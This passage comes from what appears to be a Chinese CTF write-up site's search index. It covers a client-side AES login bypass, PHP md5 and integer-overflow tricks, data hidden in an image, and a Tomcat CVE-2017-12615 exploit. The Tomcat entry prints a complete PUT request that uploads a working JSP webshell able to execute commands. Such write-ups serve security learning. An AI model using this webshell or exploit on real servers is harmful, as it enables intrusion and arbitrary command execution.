32 )), { iv : CryptoJS . enc . Hex . parse ( k . toString (). substring ( 32 , 64 )) }) == \"ob1xQz5ms9hRkPTx+ZHbVg==\" ) { t = false ; } } else { $ ( \"#cresponse\" ). html ( \"<div class='alert alert-danger'>Wrong password sorry.</div>\" ); t = false ; } if ( t ) { if ( document . location . href . indexOf ( \"?p=\" ) == - 1 ) { document . location = document . location . href + \"?p=\" + p ; } } }); \u76f4\u63a5\u628a \\x68\\x34\\x78\\x30\\x72 \u4e22\u5230\u63a7\u5236\u53f0\u5373\u53ef\u83b7\u53d6\u7528\u6237\u540d \u63a5\u4e0b\u6765\u662f\u5224\u65ad\u8f93\u5165\u5bc6\u7801\u7684 AES \u52a0\u5bc6\u7ed3\u679c\u662f\u5426\u4e0e\u6307\u5b9a\u5b57\u7b26\u4e32\u7684\u503c\u76f8\u7b49\uff0c\u7531\u4e8e\u52a0\u5bc6\u7684\u5bc6\u94a5\u548c\u521d\u59cb\u5411\u91cf\u90fd\u5df2\u77e5\uff0c\u76f4\u63a5\u89e3\u5bc6\u5c31\u53ef\u4ee5\u4e86 1 2 3 4 var k = CryptoJS . SHA256 ( \"\\x93\\x39\\x02\\x49\\x83\\x02\\x82\\xf3\\x23\\xf8\\xd3\\x13\\x37\" ); var c = \"ob1xQz5ms9hRkPTx+ZHbVg==\" ; CryptoJS . enc . Utf8 . stringify ( CryptoJS . AES . decrypt ( c , CryptoJS . enc . Hex . parse ( k . toString (). substring ( 0 , 32 )), { iv : CryptoJS . enc . Hex . parse ( k . toString (). substring ( 32 , 64 )) })) // Output: PassW0RD!289%!* \u83b7\u5f97\u7528\u6237\u540d\u548c\u5bc6\u7801\u540e Login \u5c31\u80fd\u83b7\u5f97 Flag \u4e86 \u03a6\u03c9\u03a6 \u53c2\u8003\u8d44\u6599 \u00b6 CryptoJS - CryptoJS","title":"Most Secure Crypto Algo"},{"location":"web/most_secure_crypto_algo/#_1","text":"\u9898\u76ee\u53ea\u6709\u4e00\u4e2a\u767b\u5f55\u8868\u5355 \u67e5\u770b Login \u6309\u94ae\u5173\u8054\u7684 JS \u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ ( \".c_submit\" ). click ( function ( event ) { event . preventDefault (); var k = CryptoJS . SHA256 ( \"\\x93\\x39\\x02\\x49\\x83\\x02\\x82\\xf3\\x23\\xf8\\xd3\\x13\\x37\" ); var u = $ ( \"#cuser\" ). val (); var p = $ ( \"#cpass\" ). val (); var t = true ; if ( u == \"\\x68\\x34\\x78\\x30\\x72\" ) { if ( ! CryptoJS . AES . encrypt ( p , CryptoJS . enc . Hex . parse ( k . toString (). substring ( 0 , 32 )), { iv : CryptoJS . enc . Hex . parse ( k . toString (). substring ( 32 , 64 )) }) == \"ob1xQz5ms9hRkPTx+ZHbVg==\" ) { t = false ; } } else { $ ( \"#cresponse\" ). html ( \"<div class='alert alert-danger'>Wrong password sorry.</div>\" ); t = false ; } if ( t ) { if ( document . location . href . indexOf ( \"?p=\" ) == - 1 ) { document . location = document . location . href + \"?p=\" + p ; } } }); \u76f4\u63a5\u628a \\x68\\x34\\x78\\x30\\x72 \u4e22\u5230\u63a7\u5236\u53f0\u5373\u53ef\u83b7\u53d6\u7528\u6237\u540d \u63a5\u4e0b\u6765\u662f\u5224\u65ad\u8f93\u5165\u5bc6\u7801\u7684 AES \u52a0\u5bc6\u7ed3\u679c\u662f\u5426\u4e0e\u6307\u5b9a\u5b57\u7b26\u4e32\u7684\u503c\u76f8\u7b49\uff0c\u7531\u4e8e\u52a0\u5bc6\u7684\u5bc6\u94a5\u548c\u521d\u59cb\u5411\u91cf\u90fd\u5df2\u77e5\uff0c\u76f4\u63a5\u89e3\u5bc6\u5c31\u53ef\u4ee5\u4e86 1 2 3 4 var k = CryptoJS . SHA256 ( \"\\x93\\x39\\x02\\x49\\x83\\x02\\x82\\xf3\\x23\\xf8\\xd3\\x13\\x37\" ); var c = \"ob1xQz5ms9hRkPTx+ZHbVg==\" ; CryptoJS . enc . Utf8 . stringify ( CryptoJS . AES . decrypt ( c , CryptoJS . enc . Hex . parse ( k . toString (). substring ( 0 , 32 )), { iv : CryptoJS . enc . Hex . parse ( k . toString (). substring ( 32 , 64 )) })) // Output: PassW0RD!289%!* \u83b7\u5f97\u7528\u6237\u540d\u548c\u5bc6\u7801\u540e Login \u5c31\u80fd\u83b7\u5f97 Flag \u4e86 \u03a6\u03c9\u03a6","title":"\u89e3\u9898\u601d\u8def"},{"location":"web/most_secure_crypto_algo/#_2","text":"CryptoJS - CryptoJS","title":"\u53c2\u8003\u8d44\u6599"},{"location":"web/newsctf_easy_web/","text":"Hint \u00b6 \u8fd9\u4e2a\u56fe\u7247\u771f\u597d\u770b\u5440\uff0c\u6ca1\u5565\u9690\u85cf\u7684\u4e1c\u897f\u5427 \u89e3\u9898\u601d\u8def \u00b6 \u9996\u9875\u662f\u6e90\u7801\u4ee5\u53ca \u597d\u770b \uff08\u30df\u30af\u786e\u5b9e\u597d\u770b\uff09\u7684\u80cc\u666f\u56fe 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 < html > < head > < meta http-equiv = \"Content-Type\" content = \"text/html;charset=UTF-8\" > < title > EasyWeb </ title > < style > html , body { margin : 0 ; padding : 0 ; width : 100 % ; height : 100 % ; text-align : center ; } body { background-image : url ( backImg.jpg ); background-size : contain ; } . content { width : 80 % ; text-align : left ; padding : 10 px ; margin : 0 auto ; background-color : rgb ( 255 , 255 , 255 , 0.7 ); } </ style > </ head > < body > < h1 > EasyWeb </ h1 > < div class = \"content\" > <?php highlight_file(\"index.php\") ?> </ div > < div class = \"content\" > <?php $six_number = $_POST['webp']; $a = $_POST['a']; $b = $_POST['b']; $c = $_POST['c']; if (md5($six_number) == 'e10adc3949ba59abbe56e057f20f883e' && md5($a) === md5($b) && $a !== $b) { if($array[++$c]=1){ if($array[]=1){ echo \"nonono\"; } else{ require_once 'flag.php'; echo $flag; } } } ?> </ div > </ body > </ html > e10adc3949ba59abbe56e057f20f883e \u5728\u7ebf MD5 \u89e3\u7801\u540e\u5f97\u5230 123456 \u5173\u4e8e md5($a) === md5($b) && $a !== $b \u53ef\u4ee5\u53c2\u8003 Web - Funhash \uff0c\u4f20\u5165\u4e24\u4e2a\u4e0d\u540c\u7684\u6570\u7ec4\u5373\u53ef \u5f53\u6570\u7ec4\u8d4b\u503c\u672a\u6307\u5b9a\u952e\u503c\uff08\u5982 $array[]=1 \uff09\u65f6\uff0c\u5c06\u53d6\u5f53\u524d\uff08\u4e0a\u6b21\u6570\u7ec4\u91cd\u65b0\u7d22\u5f15\u540e\u5b58\u5728\u8fc7\u7684\uff09\u6700\u5927\u6574\u6570\u7d22\u5f15\u503c\u52a0 1\uff0c\u82e5\u8fd8\u6ca1\u6709\u6574\u6570\u7d22\u5f15\uff0c\u5219\u952e\u503c\u4e3a 0 64 \u4f4d\u7cfb\u7edf\u4e0b\u7684\u6574\u6570\u6ea2\u51fa 1 2 3 4 5 6 7 8 9 10 11 <?php $large_number = 9223372036854775807 ; var_dump ( $large_number ); // int(9223372036854775807) $large_number = 9223372036854775808 ; var_dump ( $large_number ); // float(9.2233720368548E+18) $million = 1000000 ; $large_number = 50000000000000 * $million ; var_dump ( $large_number ); // float(5.0E+19) ?> $array[++$c]=1 \u9700\u8981\u80fd\u591f\u6210\u529f\u8d4b\u503c\uff0c\u800c $array[]=1 \uff08\u76f8\u5f53\u4e8e $array[$c+2]=1 \uff09\u8d4b\u503c\u5931\u8d25\u624d\u80fd\u83b7\u5f97 $flag \uff0c\u90a3\u4e48 $c \u7684\u503c\u5e94\u4e3a \\(9223372036854775806\\) \u7531\u4e8e $_POST \u9ed8\u8ba4\u53ea\u80fd\u63a5\u53d7\u5230 Content-Type: application/x-www-form-urlencoded \u7684\u6570\u636e\uff0c\u56e0\u6b64\u4ee5 GET \u8bf7\u6c42\u4e3a\u57fa\u7840\u4fee\u6539\u5e76\u53d1\u9001 POST \u8bf7\u6c42\u65f6\uff0c\u9664\u4e86\u4fee\u6539\u8bf7\u6c42\u65b9\u6cd5\u3001\u6dfb\u52a0\u8bf7\u6c42\u4e3b\u4f53\u5916\uff0c\u8981\u8bb0\u5f97\u5728\u8bf7\u6c42\u5934\u6dfb\u52a0 Content-Type \u5b57\u6bb5 \u83b7\u5f97 $flag \u7684\u5185\u5bb9 1 2 \u4f60\u89c9\u5f97\u5c31\u8fd9\u4e48\u7b80\u5355\u5417\uff1f\uff1f\uff1f\uff0c\u53ef\u4ee5\u544a\u8bc9\u4f60\u5bc6\u7801\u54e6\uff01 password: xluoyyds123456@@@ \u5bc6\u7801\uff1f(\u014f\u03c9\u014f)\u5bc6\u7801\u80af\u5b9a\u662f\u7528\u5728\u522b\u7684\u5730\u65b9\u5566~\u6839\u636e\u63d0\u793a\u4ece /backImg.jpg \u4e0b\u8f7d\u80cc\u666f\u56fe\u7247\uff08\u5b9e\u9645\u4e0a\u4e0b\u8f7d\u4e0b\u6765\u7684\u662f PNG\u2026\uff09 \u7136\u540e\u662f\u56fe\u7247\u7c7b\u9898\u76ee\u7684\u300c\u5e38\u89c4\u64cd\u4f5c\u300d 1 2 3 4 5 6 7 8 9 $ binwalk backImg.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 1054 x 745 , 8 -bit/color RGBA, non-interlaced 1522188 0x173A0C Zip archive data, encrypted at least v2.0 to extract, compressed size: 43 , uncompressed size: 36 , name: trueflag.txt 1522367 0x173ABF End of Zip archive, footer length: 22 $ dd if = backImg.png of = res.zip skip = 1522188 bs = 1 \u8f93\u5165\u5bc6\u7801\u5373\u53ef\u83b7\u5f97\u538b\u7f29\u5305\u5185\u7684 Flag\uff1a newsctf{this_1s_veryveryveryeasyweb} \u53c2\u8003\u8d44\u6599 \u00b6 PHP: Integer \u6574\u578b - Manual PHP: Array \u6570\u7ec4 - Manual","title":"NEWSCTF - easy_web"},{"location":"web/newsctf_easy_web/#hint","text":"\u8fd9\u4e2a\u56fe\u7247\u771f\u597d\u770b\u5440\uff0c\u6ca1\u5565\u9690\u85cf\u7684\u4e1c\u897f\u5427","title":"Hint"},{"location":"web/newsctf_easy_web/#_1","text":"\u9996\u9875\u662f\u6e90\u7801\u4ee5\u53ca \u597d\u770b \uff08\u30df\u30af\u786e\u5b9e\u597d\u770b\uff09\u7684\u80cc\u666f\u56fe 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 < html > < head > < meta http-equiv = \"Content-Type\" content = \"text/html;charset=UTF-8\" > < title > EasyWeb </ title > < style > html , body { margin : 0 ; padding : 0 ; width : 100 % ; height : 100 % ; text-align : center ; } body { background-image : url ( backImg.jpg ); background-size : contain ; } . content { width : 80 % ; text-align : left ; padding : 10 px ; margin : 0 auto ; background-color : rgb ( 255 , 255 , 255 , 0.7 ); } </ style > </ head > < body > < h1 > EasyWeb </ h1 > < div class = \"content\" > <?php highlight_file(\"index.php\") ?> </ div > < div class = \"content\" > <?php $six_number = $_POST['webp']; $a = $_POST['a']; $b = $_POST['b']; $c = $_POST['c']; if (md5($six_number) == 'e10adc3949ba59abbe56e057f20f883e' && md5($a) === md5($b) && $a !== $b) { if($array[++$c]=1){ if($array[]=1){ echo \"nonono\"; } else{ require_once 'flag.php'; echo $flag; } } } ?> </ div > </ body > </ html > e10adc3949ba59abbe56e057f20f883e \u5728\u7ebf MD5 \u89e3\u7801\u540e\u5f97\u5230 123456 \u5173\u4e8e md5($a) === md5($b) && $a !== $b \u53ef\u4ee5\u53c2\u8003 Web - Funhash \uff0c\u4f20\u5165\u4e24\u4e2a\u4e0d\u540c\u7684\u6570\u7ec4\u5373\u53ef \u5f53\u6570\u7ec4\u8d4b\u503c\u672a\u6307\u5b9a\u952e\u503c\uff08\u5982 $array[]=1 \uff09\u65f6\uff0c\u5c06\u53d6\u5f53\u524d\uff08\u4e0a\u6b21\u6570\u7ec4\u91cd\u65b0\u7d22\u5f15\u540e\u5b58\u5728\u8fc7\u7684\uff09\u6700\u5927\u6574\u6570\u7d22\u5f15\u503c\u52a0 1\uff0c\u82e5\u8fd8\u6ca1\u6709\u6574\u6570\u7d22\u5f15\uff0c\u5219\u952e\u503c\u4e3a 0 64 \u4f4d\u7cfb\u7edf\u4e0b\u7684\u6574\u6570\u6ea2\u51fa 1 2 3 4 5 6 7 8 9 10 11 <?php $large_number = 9223372036854775807 ; var_dump ( $large_number ); // int(9223372036854775807) $large_number = 9223372036854775808 ; var_dump ( $large_number ); // float(9.2233720368548E+18) $million = 1000000 ; $large_number = 50000000000000 * $million ; var_dump ( $large_number ); // float(5.0E+19) ?> $array[++$c]=1 \u9700\u8981\u80fd\u591f\u6210\u529f\u8d4b\u503c\uff0c\u800c $array[]=1 \uff08\u76f8\u5f53\u4e8e $array[$c+2]=1 \uff09\u8d4b\u503c\u5931\u8d25\u624d\u80fd\u83b7\u5f97 $flag \uff0c\u90a3\u4e48 $c \u7684\u503c\u5e94\u4e3a \\(9223372036854775806\\) \u7531\u4e8e $_POST \u9ed8\u8ba4\u53ea\u80fd\u63a5\u53d7\u5230 Content-Type: application/x-www-form-urlencoded \u7684\u6570\u636e\uff0c\u56e0\u6b64\u4ee5 GET \u8bf7\u6c42\u4e3a\u57fa\u7840\u4fee\u6539\u5e76\u53d1\u9001 POST \u8bf7\u6c42\u65f6\uff0c\u9664\u4e86\u4fee\u6539\u8bf7\u6c42\u65b9\u6cd5\u3001\u6dfb\u52a0\u8bf7\u6c42\u4e3b\u4f53\u5916\uff0c\u8981\u8bb0\u5f97\u5728\u8bf7\u6c42\u5934\u6dfb\u52a0 Content-Type \u5b57\u6bb5 \u83b7\u5f97 $flag \u7684\u5185\u5bb9 1 2 \u4f60\u89c9\u5f97\u5c31\u8fd9\u4e48\u7b80\u5355\u5417\uff1f\uff1f\uff1f\uff0c\u53ef\u4ee5\u544a\u8bc9\u4f60\u5bc6\u7801\u54e6\uff01 password: xluoyyds123456@@@ \u5bc6\u7801\uff1f(\u014f\u03c9\u014f)\u5bc6\u7801\u80af\u5b9a\u662f\u7528\u5728\u522b\u7684\u5730\u65b9\u5566~\u6839\u636e\u63d0\u793a\u4ece /backImg.jpg \u4e0b\u8f7d\u80cc\u666f\u56fe\u7247\uff08\u5b9e\u9645\u4e0a\u4e0b\u8f7d\u4e0b\u6765\u7684\u662f PNG\u2026\uff09 \u7136\u540e\u662f\u56fe\u7247\u7c7b\u9898\u76ee\u7684\u300c\u5e38\u89c4\u64cd\u4f5c\u300d 1 2 3 4 5 6 7 8 9 $ binwalk backImg.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 1054 x 745 , 8 -bit/color RGBA, non-interlaced 1522188 0x173A0C Zip archive data, encrypted at least v2.0 to extract, compressed size: 43 , uncompressed size: 36 , name: trueflag.txt 1522367 0x173ABF End of Zip archive, footer length: 22 $ dd if = backImg.png of = res.zip skip = 1522188 bs = 1 \u8f93\u5165\u5bc6\u7801\u5373\u53ef\u83b7\u5f97\u538b\u7f29\u5305\u5185\u7684 Flag\uff1a newsctf{this_1s_veryveryveryeasyweb}","title":"\u89e3\u9898\u601d\u8def"},{"location":"web/newsctf_easy_web/#_2","text":"PHP: Integer \u6574\u578b - Manual PHP: Array \u6570\u7ec4 - Manual","title":"\u53c2\u8003\u8d44\u6599"},{"location":"web/sale_melon/","text":"\u9898\u76ee \u00b6 \u6709\u4e00\u4e2a\u4eba\u524d\u6765\u4e70\u74dc\u3002 HQ\uff1a\u54e5\u4eec\uff0c\u8fd9\u74dc\u591a\u5c11\u94b1\u4e00\u65a4\u554a\uff1f \u4f60\uff1a\u4e24\u5757\u94b1\u4e00\u65a4\u3002 HQ\uff1aWhat's up\uff01\u8fd9\u74dc\u76ae\u5b50\u662f\u91d1\u5b50\u505a\u7684\u8fd8\u662f\u74dc\u7c92\u5b50\u662f\u91d1\u5b50\u505a\u7684\uff1f \u4f60\uff1a\u4f60\u77a7\u77a7\u73b0\u5728\u54ea\u6709\u74dc\u554a\uff1f\u8fd9\u90fd\u662f\u5927\u68da\u7684\u74dc\uff0c\u53ea\u6709 6 \u65a4\u4e00\u4e2a\u548c 9 \u65a4\u4e00\u4e2a\u7684\uff0c\u4f60\u5acc\u8d35\u6211\u8fd8\u5acc\u8d35\u5462\u3002 \uff08HQ \u5fc3\u91cc\u9ed8\u9ed8\u4e00\u7b97\uff09 HQ\uff1a\u7ed9\u6211\u6765 20 \u65a4\u7684\u74dc\u3002 \u4f60\uff1a\u884c\uff01 HQ\uff1a\u884c\uff1f\u8fd9\u74dc\u80fd\u79f0\u51fa 20 \u65a4\u5417\uff1f \u4f60\uff1a\u6211\u5f00\u6c34\u679c\u644a\u7684\uff0c\u8fd8\u4e0d\u4f1a\u79f0\u91cd\uff1f HQ\uff1a\u6211\u95ee\u4f60\u8fd9\u74dc\u80fd\u79f0\u51fa 20 \u65a4\u5417\uff1f \u4f60\uff1a\u4f60\u662f\u6545\u610f\u627e\u832c\uff0c\u662f\u4e0d\u662f\uff1f\u4f60\u8981\u4e0d\u8981\u5427\uff01 HQ\uff1a\u4f60\u8fd9\u74dc\u8981\u662f\u521a\u597d 20 \u65a4\u5417\u6211\u80af\u5b9a\u8981\u554a\u3002\u90a3\u5b83\u8981\u662f\u6ca1\u6709\u600e\u4e48\u529e\u554a\uff1f \u4f60\uff1a\u8981\u662f\u4e0d\u662f 20 \u65a4\uff0c\u6211\u81ea\u5df1\u5403\u4e86\u5b83\uff0c\u6ee1\u610f\u4e86\u5427\uff1f \uff08\u4f60\u5f00\u59cb\u9009\u74dc\u79f0\u91cd\uff09 \u8865\u5145\u8bf4\u660e\uff1a\u5f53\u79f0\u7684\u6570\u5b57\u53d8\u4e3a\u6d6e\u70b9\u6570\u800c\u4e0d\u662f\u6574\u6570\u65f6\uff0cHQ \u4e0d\u4f1a\u8ba4\u53ef\u6700\u7ec8\u7684\u79f0\u91cd\u7ed3\u679c\u3002 \u89e3\u9898\u601d\u8def \u00b6 \u5206\u522b\u6709 6 \u65a4\u548c 9 \u65a4\u7684\u74dc\uff0c\u5e76\u4e14\u53ea\u80fd\u8f93\u5165\u6574\u6570\uff0c\u76f4\u63a5\u79f0\u6839\u672c\u79f0\u4e0d\u5230 20 \u65a4 \ud83e\udd27 \u60f3\u5230\u4f1a\u4e0d\u4f1a\u662f\u6574\u6570\u6ea2\u51fa\uff0c\u7ecf\u5c1d\u8bd5\u653e 9223372036854775807 \u4e2a 9 \u65a4\u7684\u74dc\u4f1a\u6ea2\u51fa\u4e3a -9223372036854775808 \u672c\u9898\u4e0e PHP \u7684\u7279\u6027\u76f8\u5173\uff08\u505a\u9898\u7684\u65f6\u5019\u5e76\u6ca1\u770b\u6e90\u7801\u6216 HTTP \u5934\u4e4b\u7c7b\u7684x\uff09\uff0c\u5f53\u6570\u6216\u8fd0\u7b97\u7ed3\u679c\u8d85\u51fa int \u8303\u56f4\u4f1a\u88ab\u89e3\u91ca\u4e3a float\uff0c\u8fdb\u4e00\u6b65\u4f7f\u7528\u51fd\u6570 intval() \u5c06 float \u8f6c\u4e3a int \u65f6\uff0c\u7ed3\u679c\u662f\u672a\u5b9a\u4e49\u7684 \u5947\u6570\u8f6c\u5076\u6570 :) \u7531\u4e8e intval() \u51fd\u6570\u53ea\u4f5c\u7528\u4e8e\u4e58\u6cd5\uff0c\u5c0f\u5fc3\u4e0d\u8981\u8ba9\u52a0\u6cd5\u8fd0\u7b97\u7ed3\u679c\u8d85\u51fa int \u8303\u56f4 1 2 3 4 5 + 9 * 1024819115206086201 -> -9223372036854775808 + 6 * 1537228672809129301 -> -2 + 6 * 4 -> 22 + 9 * 1024819115206086201 -> -9223372036854775786 + 6 * 1537228672809129301 -> 20 \u8fd8\u53ef\u4ee5\u4e24\u6b65\u5230\u4f4d 1 2 + 9 * 1500000000000000000 -> -4946744073709551616 + 9 * 549638230412172404 -> 20 \u53c2\u8003\u8d44\u6599 \u00b6 PHP: Integer \u6574\u578b - Manual","title":"\u5356\u74dc"},{"location":"web/sale_melon/#_1","text":"\u6709\u4e00\u4e2a\u4eba\u524d\u6765\u4e70\u74dc\u3002 HQ\uff1a\u54e5\u4eec\uff0c\u8fd9\u74dc\u591a\u5c11\u94b1\u4e00\u65a4\u554a\uff1f \u4f60\uff1a\u4e24\u5757\u94b1\u4e00\u65a4\u3002 HQ\uff1aWhat's up\uff01\u8fd9\u74dc\u76ae\u5b50\u662f\u91d1\u5b50\u505a\u7684\u8fd8\u662f\u74dc\u7c92\u5b50\u662f\u91d1\u5b50\u505a\u7684\uff1f \u4f60\uff1a\u4f60\u77a7\u77a7\u73b0\u5728\u54ea\u6709\u74dc\u554a\uff1f\u8fd9\u90fd\u662f\u5927\u68da\u7684\u74dc\uff0c\u53ea\u6709 6 \u65a4\u4e00\u4e2a\u548c 9 \u65a4\u4e00\u4e2a\u7684\uff0c\u4f60\u5acc\u8d35\u6211\u8fd8\u5acc\u8d35\u5462\u3002 \uff08HQ \u5fc3\u91cc\u9ed8\u9ed8\u4e00\u7b97\uff09 HQ\uff1a\u7ed9\u6211\u6765 20 \u65a4\u7684\u74dc\u3002 \u4f60\uff1a\u884c\uff01 HQ\uff1a\u884c\uff1f\u8fd9\u74dc\u80fd\u79f0\u51fa 20 \u65a4\u5417\uff1f \u4f60\uff1a\u6211\u5f00\u6c34\u679c\u644a\u7684\uff0c\u8fd8\u4e0d\u4f1a\u79f0\u91cd\uff1f HQ\uff1a\u6211\u95ee\u4f60\u8fd9\u74dc\u80fd\u79f0\u51fa 20 \u65a4\u5417\uff1f \u4f60\uff1a\u4f60\u662f\u6545\u610f\u627e\u832c\uff0c\u662f\u4e0d\u662f\uff1f\u4f60\u8981\u4e0d\u8981\u5427\uff01 HQ\uff1a\u4f60\u8fd9\u74dc\u8981\u662f\u521a\u597d 20 \u65a4\u5417\u6211\u80af\u5b9a\u8981\u554a\u3002\u90a3\u5b83\u8981\u662f\u6ca1\u6709\u600e\u4e48\u529e\u554a\uff1f \u4f60\uff1a\u8981\u662f\u4e0d\u662f 20 \u65a4\uff0c\u6211\u81ea\u5df1\u5403\u4e86\u5b83\uff0c\u6ee1\u610f\u4e86\u5427\uff1f \uff08\u4f60\u5f00\u59cb\u9009\u74dc\u79f0\u91cd\uff09 \u8865\u5145\u8bf4\u660e\uff1a\u5f53\u79f0\u7684\u6570\u5b57\u53d8\u4e3a\u6d6e\u70b9\u6570\u800c\u4e0d\u662f\u6574\u6570\u65f6\uff0cHQ \u4e0d\u4f1a\u8ba4\u53ef\u6700\u7ec8\u7684\u79f0\u91cd\u7ed3\u679c\u3002","title":"\u9898\u76ee"},{"location":"web/sale_melon/#_2","text":"\u5206\u522b\u6709 6 \u65a4\u548c 9 \u65a4\u7684\u74dc\uff0c\u5e76\u4e14\u53ea\u80fd\u8f93\u5165\u6574\u6570\uff0c\u76f4\u63a5\u79f0\u6839\u672c\u79f0\u4e0d\u5230 20 \u65a4 \ud83e\udd27 \u60f3\u5230\u4f1a\u4e0d\u4f1a\u662f\u6574\u6570\u6ea2\u51fa\uff0c\u7ecf\u5c1d\u8bd5\u653e 9223372036854775807 \u4e2a 9 \u65a4\u7684\u74dc\u4f1a\u6ea2\u51fa\u4e3a -9223372036854775808 \u672c\u9898\u4e0e PHP \u7684\u7279\u6027\u76f8\u5173\uff08\u505a\u9898\u7684\u65f6\u5019\u5e76\u6ca1\u770b\u6e90\u7801\u6216 HTTP \u5934\u4e4b\u7c7b\u7684x\uff09\uff0c\u5f53\u6570\u6216\u8fd0\u7b97\u7ed3\u679c\u8d85\u51fa int \u8303\u56f4\u4f1a\u88ab\u89e3\u91ca\u4e3a float\uff0c\u8fdb\u4e00\u6b65\u4f7f\u7528\u51fd\u6570 intval() \u5c06 float \u8f6c\u4e3a int \u65f6\uff0c\u7ed3\u679c\u662f\u672a\u5b9a\u4e49\u7684 \u5947\u6570\u8f6c\u5076\u6570 :) \u7531\u4e8e intval() \u51fd\u6570\u53ea\u4f5c\u7528\u4e8e\u4e58\u6cd5\uff0c\u5c0f\u5fc3\u4e0d\u8981\u8ba9\u52a0\u6cd5\u8fd0\u7b97\u7ed3\u679c\u8d85\u51fa int \u8303\u56f4 1 2 3 4 5 + 9 * 1024819115206086201 -> -9223372036854775808 + 6 * 1537228672809129301 -> -2 + 6 * 4 -> 22 + 9 * 1024819115206086201 -> -9223372036854775786 + 6 * 1537228672809129301 -> 20 \u8fd8\u53ef\u4ee5\u4e24\u6b65\u5230\u4f4d 1 2 + 9 * 1500000000000000000 -> -4946744073709551616 + 9 * 549638230412172404 -> 20","title":"\u89e3\u9898\u601d\u8def"},{"location":"web/sale_melon/#_3","text":"PHP: Integer \u6574\u578b - Manual","title":"\u53c2\u8003\u8d44\u6599"},{"location":"web/t_star_tomcat/","text":"\u89e3\u9898\u601d\u8def \u00b6 \u9898\u76ee\u63cf\u8ff0\u63d0\u5230 tomcat \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff08CVE-2017-12615\uff09 \u4f7f\u7528 BurpSuit \u62e6\u622a\u7f51\u9875\u7684 GET \u8bf7\u6c42\uff0c\u5e76\u53d1\u9001\u5230 Repeater \u6784\u9020 webshell \u5e76\u53d1\u9001 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 PUT /hack.jsp/ HTTP/1.1 Host: f5b9bbe0.yunyansec.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 If-Modified-Since: Thu, 20 Jun 2019 10:03:08 GMT If-None-Match: W/\"5619-1561024988000\" Cache-Control: max-age=0 Content-Length: 660 <%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp +\"\\\\n\");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if(\"023\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\"))){out.println(\"<pre>\"+excuteCmd(request.getParameter(\"cmd\"))+\"</pre>\");}else{out.println(\":-)\");}%> \u6b64\u65f6\u53ef\u901a\u8fc7 http://f5b9bbe0.yunyansec.com/hack.jsp?&pwd=023&cmd=ls \u8fdc\u7a0b\u67e5\u770b\u6587\u4ef6\u76ee\u5f55\u4e0b\u5185\u5bb9\uff0c\u53d1\u73b0 flag.txt cat \u4e00\u4e0b\u5373\u53ef\u83b7\u53d6 Flag \u53c2\u8003\u8d44\u6599 \u00b6 Tomcat \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1eCVE-2017-12615\u590d\u73b0\u6d4b\u8bd5","title":"\u5c0f\u732b\u54aa\u8e29\u706f\u6ce1"},{"location":"web/t_star_tomcat/#_1","text":"\u9898\u76ee\u63cf\u8ff0\u63d0\u5230 tomcat \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff08CVE-2017-12615\uff09 \u4f7f\u7528 BurpSuit \u62e6\u622a\u7f51\u9875\u7684 GET \u8bf7\u6c42\uff0c\u5e76\u53d1\u9001\u5230 Repeater \u6784\u9020 webshell \u5e76\u53d1\u9001 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 PUT /hack.jsp/ HTTP/1.1 Host: f5b9bbe0.yunyansec.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 If-Modified-Since: Thu, 20 Jun 2019 10:03:08 GMT If-None-Match: W/\"5619-1561024988000\" Cache-Control: max-age=0 Content-Length: 660 <%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp +\"\\\\n\");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if(\"023\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\"))){out.println(\"<pre>\"+excuteCmd(request.getParameter(\"cmd\"))+\"</pre>\");}else{out.println(\":-)\");}%> \u6b64\u65f6\u53ef\u901a\u8fc7 http://f5b9bbe0.yunyansec.com/hack.jsp?&pwd=023&cmd=ls \u8fdc\u7a0b\u67e5\u770b\u6587\u4ef6\u76ee\u5f55\u4e0b\u5185\u5bb9\uff0c\u53d1\u73b0 flag.txt cat \u4e00\u4e0b\u5373\u53ef\u83b7\u53d6 